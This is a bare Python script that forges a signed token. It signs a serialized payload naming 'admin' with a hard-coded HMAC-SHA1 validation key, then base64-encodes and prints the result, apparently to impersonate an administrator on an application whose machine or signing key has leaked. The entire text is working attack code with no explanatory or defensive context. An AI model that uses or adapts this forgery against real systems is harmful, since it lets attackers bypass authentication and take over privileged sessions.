from hashlib import sha1
import hmac, base64

validation_key = bytes.fromhex(
    "F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796A5B4C3D2E1F0A9B8"
    "C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8"
)

data = b"\xff\x01\x0c\x01\x05admin\x01\x0bAST-4F2A9C0"
mac = hmac.new(validation_key, data, sha1).digest()
forged = base64.b64encode(data + mac).decode()
print(forged)